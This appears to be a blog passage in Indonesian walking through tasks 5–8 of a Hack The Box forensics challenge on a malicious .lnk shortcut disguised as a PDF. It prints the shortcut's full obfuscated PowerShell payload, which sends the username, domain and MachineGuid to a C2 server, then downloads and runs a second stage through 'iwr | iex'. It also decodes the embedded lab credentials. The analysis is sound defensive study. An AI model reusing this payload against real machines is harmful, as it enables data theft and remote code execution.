### Task 5

What is the full URL of the C2 contacted through a POST request?

Answer: [https://health-status-rs.com/api/v1/checkin](https://health-status-rs.com/api/v1/checkin)

Explain: untuk menemukan full URL C2 dari post req, awalnya saya curiga dengan file .ink ini karena dalam dunia digital forensic file .ink sering dipakai untuk entry point oleh pembuat malware. Jadi mereka menyembunyikan perintah/command yang berbahaya, ini juga termasuk teknik icon spoofing, yaitu sengaja mengganti icon shortcut .ink dengan icon pdf yang tujuannya untuk mengelabui korban dan korban mengira itu hanya dokumen biasa lalu melakukan double click, yang menyebabkan script yang ada di file itu berjalan di latar belakang nah untuk mencari URL C2nya saya click kanan pada file .ink tersebut dan click properties dan selanjutnya pilih tab shortcut dan lihat pada column target

![screenshot](/blog/hack-the-box-advent-of-the-relics/img-10.png)


dan benar saja disana disana terdapat payload, payload fullnya


`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe `

`-nONi -nOp -eXeC bYPaSs -cOmManD "$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh')); `

`saps .\\Health_Clearance_Guidelines.pdf;`

`$AX=$env:USERNAME;`

`$oM=[System.Uri]::UnescapeDataString('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin');`

`$Bz=$env:USERDOMAIN;`

`$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D');`

`$Mw=(gp HKLM:\\SOFTWARE\\Microsoft\\Cryptography).MachineGuid;`

`$pP = @{u=$AX;d=$Bz;g=$Mw};`

`$Zu=(iwr $oM -Method POST -Body $pP).Content;`

`$Hd = @{Authorization = $Bs };`

`iwr -Headers $Hd $Lj$Zu | iex;`

nah URL C2nya adalah pada bagian deklarasi variabel `$oM` URL tersebut di encode, yang jika saya ubah `%3A` menjadi `:` , `%2F` menjadi `/` dan yang lain-lain, maka URL C2 tempat data dikirim via POST request adalah  [https://health-status-rs.com/api/v1/checkin](https://health-status-rs.com/api/v1/checkin)

### Task 6

The malicious script sent three pieces of information in the POST request. What is the registry key from which the last one is retrieved?

Answer: HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid

Explain: Berdasarkan script/payload powershell, disana terdapat bagian data yang dibungkus untuk dikirimkan via POST request

`$pP = @{u=$AX;d=$Bz;g=$Mw}`

Yang dimana variabel `$pP `berisi 3 informasi

1. u=\$AX yang diambil dari \$env:USERNAME
2. d=\$Bz yang diambil dari \$env:USERDOMAIN
3. g=\$Mw (ini adalah informasi terakhir)

dan isi dari variabel \$Mw adalah `HKLM:\\SOFTWARE\\Microsoft\\Cryptography).MachineGuid` yang jika dirapihkan menjadi HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid

### Task 7

Then the script downloads and executes a second stage from another URL. What is the domain?

Answer: advent-of-the-relics-forum.htb.blue

Explain: Setelah berhasil check-in (POST request), server akan membalas dengan sebuah ID yang disimpan dalam variabel `$Zu` . Kemudian, script ini memanggil URL C2 kedua (di variabel `$Lj`) yang berisi `https://`[`advent-of-the-relics-forum.htb.blue`](http://advent-of-the-relics-forum.htb.blue)`/api/v1/implant/cid=` dan menggabungkannya dengan ID tadi untuk mengunduh tahap malware selanjutnya, lalu mengeksekusinya langsung di memori dengan perintah `iex` (*Invoke-Expression*). Jadi domainnya adalah advent-of-the-relics-forum.htb.blue yang jika dibuka akan terlihat seperti ini

![screenshot](/blog/hack-the-box-advent-of-the-relics/img-11.png)

### Task 8

A set of credentials was used to access the previous resource. Retrieve them.

Answer: svc\_temp:SnowBlackOut\_2026!

Explain: Untuk menemukan credential tersebut, saya melihat bagaimana script melakukan permintaan kedua ke URL advent-of-the-relics-forum.htb.blue, pada akhir script terdapat

`$Hd = @{Authorization = $Bs };`


`iwr -Headers $Hd $Lj$Zu | iex;`  
Permintaan web `(iwr)` tersebut menggunakan header Authorization yang nilainya diambil dari variabel `$Bs`. Dan isi dari variabel tersebut adalah


`$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'))`

Script ini menggunakan fungsi -join untuk menggabungkan potonga-potongan string menjadi satu kesatuan demi menghindari deteksi. Jika saya gabungkan semua hasilnya menjadi `Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh` yang jika saya decode saya mendapatkan format username:password  dan hasilnya adalah svc\_temp:SnowBlackOut\_2026!. Jadi, set credential yang digunakan adalah

- Username: svc\_temp
- Password: SnowBlackOut\_2026!

Yang jika saya masukkan passwordnya pada domain [https://advent-of-the-relics-forum.htb.blue/](https://advent-of-the-relics-forum.htb.blue/) saya bisa masuk ke dalamnya
